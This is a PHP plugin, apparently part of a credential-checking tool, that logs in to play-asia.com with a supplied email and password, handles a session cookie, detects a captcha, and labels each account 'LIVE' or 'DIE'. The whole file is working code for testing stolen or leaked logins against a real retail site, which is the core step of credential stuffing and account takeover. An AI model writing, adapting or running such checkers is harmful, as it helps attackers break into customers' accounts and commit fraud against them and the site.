<?php
class check_playasia extends plugins {
	public $id = "playasia";
	public $name = "Check playasia";
	public $version = "1.0.0";
	public $descrition = "Check playasia acc";

	public $fields = array(
		"status" => "str"
	);

	public function check($user,$pass,$request) {
		return $this->runCheck($user,$pass);
	}

	private function runCheck($m,$p) {
		// delete old cookie
		$this->startSession();

		$return = array();

		$url = "https://www.play-asia.com/login/";

		$html = $this->connect($url);

		if (!preg_match('/setCookie\(\'(.+?)\', \'(.+?)\'/i',$html,$match)) {
			$return['status'] = "ERROR";
			return $return;
		}

		$cookie = array(CURLOPT_HTTPHEADER => array("Cookie: ".$match[1]."=".$match[2].";path=/;host=www.play-asia.com"));

		$html = $this->connect($url,$url,null,array("curl"=>$cookie));

		if (strpos($html, "recaptcha_widget_div") !== false) {
			$return['status'] = "CAPTCHA";
			return $return;
		}

		$data = $this->get_field($html,"login");

		$data["email_address"] = $m;
		$data["password"] = $p;

		$html = $this->connect("https://www.play-asia.com/login/28process",$url,$data,array("curl"=>$cookie,"header_only"=>true));

		if (strpos($html,'Set-Cookie: recommend2=') === false) {
			$return['status'] = "DIE";
			return $return;
		}

		$return['status'] = "LIVE";
		return $return;
	}

}
?>
